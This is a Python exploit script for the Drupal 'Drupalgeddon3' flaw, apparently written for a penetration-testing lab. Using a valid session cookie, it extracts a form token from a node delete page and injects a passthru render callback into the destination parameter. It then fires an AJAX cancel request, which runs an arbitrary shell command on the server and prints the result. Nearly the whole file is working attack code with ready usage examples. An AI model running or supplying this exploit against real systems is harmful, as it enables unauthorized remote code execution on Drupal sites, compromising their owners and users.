import requests
from urllib.parse import quote
import re,sys

'''
[Usage]
python drupalgeddon3.py [URL] [Session] [Exist Node number] [Command]

[Example]
python3 drupalgeddon3.py "http://target" "SESS45ecfcb93a827c3e578eae161f280548=ZYEVow1KQyYotFi1lL3gJedM-j7kYpJtubXpgYgMmH0" 1 "id"
'''

try:
    # === CONFIGURATION ===
    target  =  sys.argv[1]
    session_cookie  = sys.argv[2]
    node_id = sys.argv[3]
    command = sys.argv[4]

    # === Cookie Setup ===
    cookies = dict(cookie.strip().split("=", 1) for cookie in session_cookie.split(";") if "=" in cookie)

    # === Step 1: Get CSRF Token ===
    res = requests.get(f"{target}node/{node_id}/delete", cookies=cookies)

    m = re.search(r'name="form_token"\s+value="([^"]+)"', res.text)
    if not m:
        print("[!] Failed to extract form_token")
        exit(1)

    form_token = m.group(1)
    print(f"[+] form_token: {form_token}")

    # === Step 2: Send crafted delete request with PHP injection ===
    post_data = {
        "form_id": "node_delete_confirm",
        "_triggering_element_name": "form_id",
        "form_token": form_token
    }
    res = requests.post(target+'?q=node/'+f'{node_id}'+'/delete&destination=node?q[%2523post_render][]=passthru%26q[%2523type]=markup%26q[%2523markup]='+command, data=post_data, cookies=cookies)


    # === Step 3: Extract form_build_id ===
    m = re.search(r'name="form_build_id"\s+value="([^"]+)"', res.text)
    if not m:
        print("[!] Failed to extract form_build_id")
        exit(1)

    form_build_id = m.group(1)
    print(f"[+] form_build_id: {form_build_id}")

    # === Step 4: Trigger the RCE via AJAX callback ===
    ajax_url = f"{target}?q=file/ajax/actions/cancel/%23options/path/{form_build_id}"
    res = requests.post(ajax_url, data={"form_build_id": form_build_id}, cookies=cookies)

    print("\n[+] Exploit Output:")
    print(res.text.split('[', 1)[0])
except:
  print('\n[Usage]\npython drupalgeddon3.py [URL] [Session] [Exist Node number] [Command]\n\n[Example]\npython3 drupalgeddon3.py "http://drupal-acc.inlanefreight.local/" "SESS45ecfcb93a827c3e578eae161f280548=rQR90Es6aZgyWOIAxud4epAPfNbqPvEVA7Noj_G6lhw" 1 "id"\n')
